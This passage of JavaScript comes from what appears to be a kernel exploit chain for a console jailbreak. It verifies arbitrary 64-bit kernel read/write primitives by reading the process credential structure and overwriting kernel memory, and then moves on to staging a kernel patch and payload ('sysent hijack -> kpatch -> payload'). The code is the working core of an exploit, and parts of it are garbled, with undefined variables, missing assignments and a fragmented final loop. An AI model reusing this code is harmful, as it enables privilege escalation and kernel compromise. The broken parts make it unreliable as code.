          const t1 = kread32(A_OID.add32(0x10));
          mark("KRW-T1-READ32-IMG", "*(A_oid+0x10)=" + t1 + " want=27");
          check("krw-read32-image", t1 === 27, "got=" + t1);

          const t2 = read8(A_OID.add32(0x10));
          const t2ok = t2.low >>> 0 === 27 && t2.hi >>> 0 === 0xc0040002;
          mark(
            "KRW-T2-READ8-IMG",
            "*(A_oid+0x10)=" + t2 + " want=lo:27 hi:0xc0040002",
          );
          check("krw-read8-image", t2ok, "got=" + t2);

          const uidNow = sc(SYS.getuid).i32 >>> 0;
          const t3 = kread32(UCRED.add32(0x04));
          mark(
            "KRW-T3-READ32-HEAP",
            "*(ucred+0x04)=cr_uid=" + t3 + " getuid=" + uidNow,
          );
          check(
            "krw-read32-heap",
            t3 === uidNow,
            "cr_uid=" + t3 + " getuid=" + uidNow,
          );
          mark("KRW-T3B-READ8-HEAP", "read8(ucred)=" + read8(UCRED));

          const SCR4 = KBASE.add32(off.k_arg1_maxfiles);
          const o4 = kread32(SCR4);
          kwrite32(SCR4, 0x41424344);
          const r4 = kread32(SCR4);
          kwrite32(SCR4, o4 | 0);
          const b4 = kread32(SCR4);
          mark(
            "KRW-T4-WRITE32",
            "orig=" +
              o4 +
              " wrote=0x41424344 readback=0x" +
              r4.toString(16) +
              " restored=" +
              b4,
          );
          check(
            "krw-write32",
            r4 === 0x41424344 && b4 === o4,
            "readback=0x" + r4.toString(16) + " restored=" + b4,
          );

          const SCR8 = KBASE.add32(off.k_oid_maxfiles + 0x20);

          const MAGIC8 = new int64(0xdeadbeef, 0x11223344);
          write8(SCR8, MAGIC8);
          const r8 = read8(SCR8);
          write8(SCR8, o8);
          const b8 = read8(SCR8);

            r8.low >>> 0 === 0xdeadbeef &&
            r8.hi >>> 0 === 0x11223344 &&
            b8.low >>> 0 === o8.low >>> 0 &&
            b8.hi >>> 0 === o8.hi >>> 0;
          mark(
            "KRW-T5-WRITE64",
            "orig=" +
              o8 +
              " wrote=" +
              MAGIC8 +
              " readback=" +
              r8 +
              " restored=" +
              b8,
          );
          check("krw-write64", t5ok, "readback=" + r8 + " restored=" + b8);

          mark(
            "KRW-VERDICT",
            "fw=" +
              fwKey +
              " kernel_base=" +
              KBASE +
              " read32=" +
              (t1 === 27 ? 1 : 0) +
              " read8=" +
              (t2ok ? 1 : 0) +
              " heap=" +
              (t3 === uidNow ? 1 : 0) +
              " write32=" +
              (r4 === 0x41424344 ? 1 : 0) +
              " write64=" +
              (t5ok ? 1 : 0) +
              " armings=" +
              armCount +
              "  ** full 64-bit arbitrary kernel R/W, syscall speed, 0 armings **",
          );
          mark(
            "KRW-API",
            "read8/write8/kread32/kwrite32 ready -- drop into the" +
              " lapse/poops jailbreak stages (sysent hijack -> kpatch -> payload)",
          );

          const krwOk =
            t1 === 27 && t2ok && t3 === uidNow && r4 === 0x41424344 && t5ok;
          mark(
            "EG-GATE",
            "krwOk=" +
              (krwOk ? 1 : 0) +
              " jb=" +
              (DO_JB ? 1 : 0) +
              " patch=" +
              (DO_PATCH ? 1 : 0) +
              " payload=" +
              (DO_PAYLOAD ? 1 : 0),
          );
          if (
            !check(
              "eg-krw-ok",
              krwOk,
              "krwOk=" +
                (krwOk ? 1 : 0) +
                " (endgame needs all 5 KRW self-tests to pass)",
            )
          ) {
            allDone = true;
          } else {
            const sameI64 = (a, b) =>
              a.low >>> 0 === b.low >>> 0 && a.hi >>> 0 === b.hi >>> 0;
            const kptr = (v) => !!v && v.hi >>> 0 >= 0xffff0000;
            const NEG1 = new int64(0xffffffff, 0xffffffff);

            let jbDone = false,
              kpDone = false,
              plDone = false,
              jbUcred = null;
            let jbSaved = null,
              jbRestored = false;

            let kpatchBlob = null,
              payloadBlob = null;
            const SITES = [];
            if (DO_PATCH) {
              try {
                const buf = (await kpatchPromise) || (await fetch(KPATCH_FILE).then(r => r.ok ? r.arrayBuffer() : null).catch(() => null));
                if (buf) kpatchBlob = new Uint8Array(buf);
              } catch (e) {

              }

                for (let i = 0; i + 7 <= kpatchBlob.length; i++) {

                    continue;

                    (kpatchBlob[i + 2] |

                      (kpatchBlob[i + 4] << 16) |

                "KPATCH-BLOB",
